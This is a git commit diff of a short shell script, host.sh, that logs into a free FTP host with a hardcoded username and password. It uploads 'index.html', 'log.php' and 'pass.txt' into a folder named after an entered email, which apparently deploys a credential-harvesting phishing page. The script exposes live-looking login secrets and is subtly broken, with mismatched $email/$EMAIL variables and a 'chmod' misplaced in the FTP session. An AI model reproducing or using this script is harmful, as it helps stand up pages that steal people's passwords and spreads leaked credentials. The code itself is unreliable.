e61a2406de03b067e33126aba50a2d1fdaf56511
nerdhaka <114361549+nerdhaka@users.noreply.github.com>
2022-10-05 13:36:45 +0000

    Update host.sh

--- host.sh
+++ host.sh
@@ -2,15 +2,18 @@
 echo "Enter your email:"
 read EMAIL
 #Automated FTP transfer 
-HOST='185.27.134.34' 
+HOST='ftpupload.net' 
 USER='epiz_32719615'
 PASSWD='ElDdJprQglYAk'
-FILE='file.txt'
+FILE='index.html log.php pass.txt'
 
 ftp -n $HOST <<END_SCRIPT
 quote USER $USER
 quote PASS $PASSWD
 binary
+chmod +x *
+mkdir site/$email
+cd $EMAIL
 put $FILE
 quit
 END_SCRIPT
